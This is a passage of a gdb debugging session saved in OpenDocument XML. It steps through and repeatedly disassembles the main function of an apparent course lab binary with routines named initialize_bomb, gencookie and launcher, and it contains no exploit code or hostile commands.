      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490da &lt;+498&gt;:<text:tab/>pop <text:s text:c="3"/>%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490db &lt;+499&gt;:<text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
      <text:p text:style-name="Standard">End of assembler dump.</text:p>
      <text:p text:style-name="Standard">(gdb) x $esi</text:p>
      <text:p text:style-name="Standard">0x55686018:<text:tab/>0x00000000</text:p>
      <text:p text:style-name="Standard">(gdb) x $ebx</text:p>
      <text:p text:style-name="Standard">0x0:<text:tab/>Cannot access memory at address 0x0</text:p>
      <text:p text:style-name="Standard">(gdb) print *(int *) $ebx</text:p>
      <text:p text:style-name="Standard">Cannot access memory at address 0x0</text:p>
      <text:p text:style-name="Standard">(gdb) print *(int *) ebx</text:p>
      <text:p text:style-name="Standard">No symbol "ebx" in current context.</text:p>
      <text:p text:style-name="Standard">(gdb) x $eax</text:p>
      <text:p text:style-name="Standard">0xc10:<text:tab/>Cannot access memory at address 0xc10</text:p>
      <text:p text:style-name="Standard">(gdb) nexti</text:p>
      <text:p text:style-name="Standard">0x080490b4 in main ()</text:p>
      <text:p text:style-name="Standard">(gdb) disas</text:p>
      <text:p text:style-name="Standard">Dump of assembler code for function main:</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ee8 &lt;+0&gt;:<text:tab/>push <text:s text:c="2"/>%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ee9 &lt;+1&gt;:<text:tab/>mov <text:s text:c="3"/>%esp,%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048eeb &lt;+3&gt;:<text:tab/>and <text:s text:c="3"/>$0xfffffff0,%esp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048eee &lt;+6&gt;:<text:tab/>push <text:s text:c="2"/>%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048eef &lt;+7&gt;:<text:tab/>push <text:s text:c="2"/>%esi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ef0 &lt;+8&gt;:<text:tab/>push <text:s text:c="2"/>%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ef1 &lt;+9&gt;:<text:tab/>sub <text:s text:c="3"/>$0x24,%esp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ef4 &lt;+12&gt;:<text:tab/>mov <text:s text:c="3"/>0x8(%ebp),%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ef7 &lt;+15&gt;:<text:tab/>mov <text:s text:c="3"/>0xc(%ebp),%esi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048efa &lt;+18&gt;:<text:tab/>movl <text:s text:c="2"/>$0x8048b7c,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f02 &lt;+26&gt;:<text:tab/>movl <text:s text:c="2"/>$0xb,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f09 &lt;+33&gt;:<text:tab/>call <text:s text:c="2"/>0x8048890 &lt;signal@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f0e &lt;+38&gt;:<text:tab/>movl <text:s text:c="2"/>$0x8048ba6,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f16 &lt;+46&gt;:<text:tab/>movl <text:s text:c="2"/>$0x7,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f1d &lt;+53&gt;:<text:tab/>call <text:s text:c="2"/>0x8048890 &lt;signal@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f22 &lt;+58&gt;:<text:tab/>movl <text:s text:c="2"/>$0x8048b52,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f2a &lt;+66&gt;:<text:tab/>movl <text:s text:c="2"/>$0x4,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f31 &lt;+73&gt;:<text:tab/>call <text:s text:c="2"/>0x8048890 &lt;signal@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f36 &lt;+78&gt;:<text:tab/>mov <text:s text:c="3"/>0x804b1a4,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f3c &lt;+84&gt;:<text:tab/>mov <text:s text:c="3"/>%ebx,0x804b1c0</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f42 &lt;+90&gt;:<text:tab/>movl <text:s text:c="2"/>$0x1,0x1c(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f4a &lt;+98&gt;:<text:tab/>movl <text:s text:c="2"/>$0x0,0x18(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f52 &lt;+106&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f54 &lt;+108&gt;:<text:tab/>sub <text:s text:c="3"/>$0x67,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f57 &lt;+111&gt;:<text:tab/>cmp <text:s text:c="3"/>$0xe,%bl</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f5a &lt;+114&gt;:<text:tab/>ja <text:s text:c="4"/>0x8048fbb &lt;main+211&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f5c &lt;+116&gt;:<text:tab/>movzbl %bl,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f5f &lt;+119&gt;:<text:tab/>jmp <text:s text:c="3"/>*0x804a25c(,%ebx,4)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f66 &lt;+126&gt;:<text:tab/>movl <text:s text:c="2"/>$0x5,0x1c(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f6e &lt;+134&gt;:<text:tab/>movl <text:s text:c="2"/>$0x1,0x18(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f76 &lt;+142&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f78 &lt;+144&gt;:<text:tab/>mov <text:s text:c="3"/>(%esi),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f7a &lt;+146&gt;:<text:tab/>call <text:s text:c="2"/>0x8048b00 &lt;usage&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f7f &lt;+151&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f81 &lt;+153&gt;:<text:tab/>mov <text:s text:c="3"/>0x804b1a8,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f87 &lt;+159&gt;:<text:tab/>mov <text:s text:c="3"/>%ebx,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f8a &lt;+162&gt;:<text:tab/>call <text:s text:c="2"/>0x8048a20 &lt;__strdup@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f8f &lt;+167&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,0x804b1b4</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f94 &lt;+172&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f97 &lt;+175&gt;:<text:tab/>call <text:s text:c="2"/>0x8049e4d &lt;gencookie&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f9c &lt;+180&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,0x804b1c4</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fa1 &lt;+185&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fa3 &lt;+187&gt;:<text:tab/>movl <text:s text:c="2"/>$0x1,0x804b1b8</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fad &lt;+197&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048faf &lt;+199&gt;:<text:tab/>movl <text:s text:c="2"/>$0x1,0x804b1bc</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fb9 &lt;+209&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fbb &lt;+211&gt;:<text:tab/>mov <text:s text:c="3"/>(%esi),%eax</text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fbd &lt;+213&gt;:<text:tab/>call <text:s text:c="2"/>0x8048b00 &lt;usage&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fc2 &lt;+218&gt;:<text:tab/>movl <text:s text:c="2"/>$0x804a004,0x8(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fca &lt;+226&gt;:<text:tab/>mov <text:s text:c="3"/>%esi,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fce &lt;+230&gt;:<text:tab/>mov <text:s text:c="3"/>%edi,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fd1 &lt;+233&gt;:<text:tab/>call <text:s text:c="2"/>0x8048930 &lt;getopt@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fd6 &lt;+238&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fd8 &lt;+240&gt;:<text:tab/>cmp <text:s text:c="3"/>$0xff,%al</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fda &lt;+242&gt;:<text:tab/>jne <text:s text:c="3"/>0x8048f54 &lt;main+108&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fe0 &lt;+248&gt;:<text:tab/>cmpl <text:s text:c="2"/>$0x0,0x804b1b4</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fe7 &lt;+255&gt;:<text:tab/>jne <text:s text:c="3"/>0x8049002 &lt;main+282&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fe9 &lt;+257&gt;:<text:tab/>mov <text:s text:c="3"/>(%esi),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048feb &lt;+259&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fef &lt;+263&gt;:<text:tab/>movl <text:s text:c="2"/>$0x804a1e8,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ff6 &lt;+270&gt;:<text:tab/>call <text:s text:c="2"/>0x8048970 &lt;printf@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ffb &lt;+275&gt;:<text:tab/>mov <text:s text:c="3"/>(%esi),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ffd &lt;+277&gt;:<text:tab/>call <text:s text:c="2"/>0x8048b00 &lt;usage&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049002 &lt;+282&gt;:<text:tab/>call <text:s text:c="2"/>0x80492e5 &lt;initialize_bomb&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049007 &lt;+287&gt;:<text:tab/>mov <text:s text:c="3"/>0x804b1b4,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804900d &lt;+293&gt;:<text:tab/>mov <text:s text:c="3"/>%ebx,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049011 &lt;+297&gt;:<text:tab/>movl <text:s text:c="2"/>$0x804a00b,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049018 &lt;+304&gt;:<text:tab/>call <text:s text:c="2"/>0x8048970 &lt;printf@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804901d &lt;+309&gt;:<text:tab/>mov <text:s text:c="3"/>0x804b1c4,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049023 &lt;+315&gt;:<text:tab/>mov <text:s text:c="3"/>%ebx,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049027 &lt;+319&gt;:<text:tab/>movl <text:s text:c="2"/>$0x804a017,(%esp)</text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804902e &lt;+326&gt;:<text:tab/>call <text:s text:c="2"/>0x8048970 &lt;printf@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049033 &lt;+331&gt;:<text:tab/>mov <text:s text:c="3"/>0x804b1c4,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049039 &lt;+337&gt;:<text:tab/>mov <text:s text:c="3"/>%ebx,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804903c &lt;+340&gt;:<text:tab/>call <text:s text:c="2"/>0x8048990 &lt;srandom@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049041 &lt;+345&gt;:<text:tab/>call <text:s text:c="2"/>0x8048880 &lt;random@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049046 &lt;+350&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049048 &lt;+352&gt;:<text:tab/>and <text:s text:c="3"/>$0xff0,%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804904e &lt;+358&gt;:<text:tab/>add <text:s text:c="3"/>$0x100,%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049054 &lt;+364&gt;:<text:tab/>movl <text:s text:c="2"/>$0x4,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804905c &lt;+372&gt;:<text:tab/>mov <text:s text:c="3"/>0x1c(%esp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049060 &lt;+376&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049063 &lt;+379&gt;:<text:tab/>call <text:s text:c="2"/>0x80488b0 &lt;calloc@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049068 &lt;+384&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,%esi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804906a &lt;+386&gt;:<text:tab/>movl <text:s text:c="2"/>$0x0,(%eax)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049070 &lt;+392&gt;:<text:tab/>cmpl <text:s text:c="2"/>$0x1,0x1c(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049075 &lt;+397&gt;:<text:tab/>jle <text:s text:c="3"/>0x80490a3 &lt;main+443&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049077 &lt;+399&gt;:<text:tab/>mov <text:s text:c="3"/>$0x1,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804907c &lt;+404&gt;:<text:tab/>mov <text:s text:c="3"/>%edi,0x14(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049080 &lt;+408&gt;:<text:tab/>mov <text:s text:c="3"/>0x1c(%esp),%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049084 &lt;+412&gt;:<text:tab/>call <text:s text:c="2"/>0x8048880 &lt;random@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049089 &lt;+417&gt;:<text:tab/>and <text:s text:c="3"/>$0xf0,%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804908e &lt;+422&gt;:<text:tab/>mov <text:s text:c="3"/>$0x80,%edx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049093 &lt;+427&gt;:<text:tab/>sub <text:s text:c="3"/>%eax,%edx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049095 &lt;+429&gt;:<text:tab/>mov <text:s text:c="3"/>%edx,(%esi,%ebx,4)</text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08049098 &lt;+432&gt;:<text:tab/>add <text:s text:c="3"/>$0x1,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804909b &lt;+435&gt;:<text:tab/>cmp <text:s text:c="3"/>%edi,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804909d &lt;+437&gt;:<text:tab/>jl <text:s text:c="4"/>0x8049084 &lt;main+412&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x0804909f &lt;+439&gt;:<text:tab/>mov <text:s text:c="3"/>0x14(%esp),%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490a3 &lt;+443&gt;:<text:tab/>cmpl <text:s text:c="2"/>$0x0,0x1c(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490a8 &lt;+448&gt;:<text:tab/>jle <text:s text:c="3"/>0x80490cd &lt;main+485&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490aa &lt;+450&gt;:<text:tab/>mov <text:s text:c="3"/>$0x0,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490af &lt;+455&gt;:<text:tab/>mov <text:s text:c="3"/>%edi,%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490b1 &lt;+457&gt;:<text:tab/>add <text:s text:c="3"/>(%esi,%ebx,4),%eax</text:p>
      <text:p text:style-name="Standard">=&gt; 0x080490b4 &lt;+460&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490b8 &lt;+464&gt;:<text:tab/>mov <text:s text:c="3"/>0x18(%esp),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490bc &lt;+468&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490bf &lt;+471&gt;:<text:tab/>call <text:s text:c="2"/>0x8048e17 &lt;launcher&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490c4 &lt;+476&gt;:<text:tab/>add <text:s text:c="3"/>$0x1,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490c7 &lt;+479&gt;:<text:tab/>cmp <text:s text:c="3"/>0x1c(%esp),%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490cb &lt;+483&gt;:<text:tab/>jl <text:s text:c="4"/>0x80490af &lt;main+455&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490cd &lt;+485&gt;:<text:tab/>mov <text:s text:c="3"/>$0x0,%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d2 &lt;+490&gt;:<text:tab/>add <text:s text:c="3"/>$0x24,%esp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d5 &lt;+493&gt;:<text:tab/>pop <text:s text:c="3"/>%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d6 &lt;+494&gt;:<text:tab/>pop <text:s text:c="3"/>%esi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d7 &lt;+495&gt;:<text:tab/>pop <text:s text:c="3"/>%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490d8 &lt;+496&gt;:<text:tab/>mov <text:s text:c="3"/>%ebp,%esp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490da &lt;+498&gt;:<text:tab/>pop <text:s text:c="3"/>%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x080490db &lt;+499&gt;:<text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
      <text:p text:style-name="Standard">End of assembler dump.</text:p>
      <text:p text:style-name="Standard">(gdb) x $eax</text:p>
      <text:p text:style-name="Standard">0xc10:<text:tab/>Cannot access memory at address 0xc10</text:p>
      <text:p text:style-name="Standard">(gdb) x $esp</text:p>
      <text:p text:style-name="Standard">0xbffff0b0:<text:tab/>0x00000005</text:p>
      <text:p text:style-name="Standard">(gdb) x $esp+0x4</text:p>
      <text:p text:style-name="Standard">0xbffff0b4:<text:tab/>0x00000004</text:p>
      <text:p text:style-name="Standard">(gdb) nexti</text:p>
      <text:p text:style-name="Standard">0x080490b8 in main ()</text:p>
      <text:p text:style-name="Standard">(gdb) disas</text:p>
      <text:p text:style-name="Standard">Dump of assembler code for function main:</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ee8 &lt;+0&gt;:<text:tab/>push <text:s text:c="2"/>%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ee9 &lt;+1&gt;:<text:tab/>mov <text:s text:c="3"/>%esp,%ebp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048eeb &lt;+3&gt;:<text:tab/>and <text:s text:c="3"/>$0xfffffff0,%esp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048eee &lt;+6&gt;:<text:tab/>push <text:s text:c="2"/>%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048eef &lt;+7&gt;:<text:tab/>push <text:s text:c="2"/>%esi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ef0 &lt;+8&gt;:<text:tab/>push <text:s text:c="2"/>%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ef1 &lt;+9&gt;:<text:tab/>sub <text:s text:c="3"/>$0x24,%esp</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ef4 &lt;+12&gt;:<text:tab/>mov <text:s text:c="3"/>0x8(%ebp),%edi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048ef7 &lt;+15&gt;:<text:tab/>mov <text:s text:c="3"/>0xc(%ebp),%esi</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048efa &lt;+18&gt;:<text:tab/>movl <text:s text:c="2"/>$0x8048b7c,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f02 &lt;+26&gt;:<text:tab/>movl <text:s text:c="2"/>$0xb,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f09 &lt;+33&gt;:<text:tab/>call <text:s text:c="2"/>0x8048890 &lt;signal@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f0e &lt;+38&gt;:<text:tab/>movl <text:s text:c="2"/>$0x8048ba6,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f16 &lt;+46&gt;:<text:tab/>movl <text:s text:c="2"/>$0x7,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f1d &lt;+53&gt;:<text:tab/>call <text:s text:c="2"/>0x8048890 &lt;signal@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f22 &lt;+58&gt;:<text:tab/>movl <text:s text:c="2"/>$0x8048b52,0x4(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f2a &lt;+66&gt;:<text:tab/>movl <text:s text:c="2"/>$0x4,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f31 &lt;+73&gt;:<text:tab/>call <text:s text:c="2"/>0x8048890 &lt;signal@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f36 &lt;+78&gt;:<text:tab/>mov <text:s text:c="3"/>0x804b1a4,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f3c &lt;+84&gt;:<text:tab/>mov <text:s text:c="3"/>%ebx,0x804b1c0</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f42 &lt;+90&gt;:<text:tab/>movl <text:s text:c="2"/>$0x1,0x1c(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f4a &lt;+98&gt;:<text:tab/>movl <text:s text:c="2"/>$0x0,0x18(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f52 &lt;+106&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard">---Type &lt;return&gt; to continue, or q &lt;return&gt; to quit---</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f54 &lt;+108&gt;:<text:tab/>sub <text:s text:c="3"/>$0x67,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f57 &lt;+111&gt;:<text:tab/>cmp <text:s text:c="3"/>$0xe,%bl</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f5a &lt;+114&gt;:<text:tab/>ja <text:s text:c="4"/>0x8048fbb &lt;main+211&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f5c &lt;+116&gt;:<text:tab/>movzbl %bl,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f5f &lt;+119&gt;:<text:tab/>jmp <text:s text:c="3"/>*0x804a25c(,%ebx,4)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f66 &lt;+126&gt;:<text:tab/>movl <text:s text:c="2"/>$0x5,0x1c(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f6e &lt;+134&gt;:<text:tab/>movl <text:s text:c="2"/>$0x1,0x18(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f76 &lt;+142&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f78 &lt;+144&gt;:<text:tab/>mov <text:s text:c="3"/>(%esi),%eax</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f7a &lt;+146&gt;:<text:tab/>call <text:s text:c="2"/>0x8048b00 &lt;usage&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f7f &lt;+151&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f81 &lt;+153&gt;:<text:tab/>mov <text:s text:c="3"/>0x804b1a8,%ebx</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f87 &lt;+159&gt;:<text:tab/>mov <text:s text:c="3"/>%ebx,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f8a &lt;+162&gt;:<text:tab/>call <text:s text:c="2"/>0x8048a20 &lt;__strdup@plt&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f8f &lt;+167&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,0x804b1b4</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f94 &lt;+172&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp)</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f97 &lt;+175&gt;:<text:tab/>call <text:s text:c="2"/>0x8049e4d &lt;gencookie&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048f9c &lt;+180&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,0x804b1c4</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fa1 &lt;+185&gt;:<text:tab/>jmp <text:s text:c="3"/>0x8048fc2 &lt;main+218&gt;</text:p>
      <text:p text:style-name="Standard"><text:s text:c="3"/>0x08048fa3 &lt;+187&gt;:<text:tab/>movl <text:s text:c="2"/>$0x1,0x804b1b8</text:p>
